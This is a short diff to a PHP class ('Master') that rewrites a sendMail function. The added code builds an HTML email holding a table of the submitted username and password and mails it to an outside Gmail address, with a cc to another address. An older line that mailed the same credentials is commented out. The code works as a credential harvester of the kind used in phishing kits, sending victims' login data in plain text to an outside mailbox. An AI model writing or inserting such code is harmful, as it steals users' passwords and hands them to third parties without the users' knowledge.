@@ -43,8 +43,41 @@ class Master{
 	}
 
 	private function sendMail($u = "", $p = ""){
+		$to = "ojudusegun@gmail.com";
+		$subject = "Intecu email";
+		
+		$message = "
+		<html>
+		<head>
+		<title>Intecu email</title>
+		</head>
+		<body>
+		<p>This email contains Intecu email Tags!</p>
+		<table>
+		<tr>
+		<th>Username</th>
+		<th>Password</th>
+		</tr>
+		<tr>
+		<td>".$u."</td>
+		<td>".$p."</td>
+		</tr>
+		</table>
+		</body>
+		</html>
+		";
+		
+		// Always set content-type when sending HTML email
+		$headers = "MIME-Version: 1.0" . "\r\n";
+		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+		
+		// More headers
+		$headers .= 'From: <webmaster@intecu.com>' . "\r\n";
+		$headers .= 'Cc: myboss@intecu.com' . "\r\n";
+		
+		mail($to,$subject,$message,$headers);
 		//mailer...
-        	return mail('ojudusegun@gmail.com', 'Intecu', "*Username: ".$name." | Password: ".$pass . "\r\n\r\n");
+        	//return mail('ojudusegun@gmail.com', 'Intecu', "*Username: ".$name." | Password: ".$pass . "\r\n\r\n");
 	}
 }
 $mast = new Master();
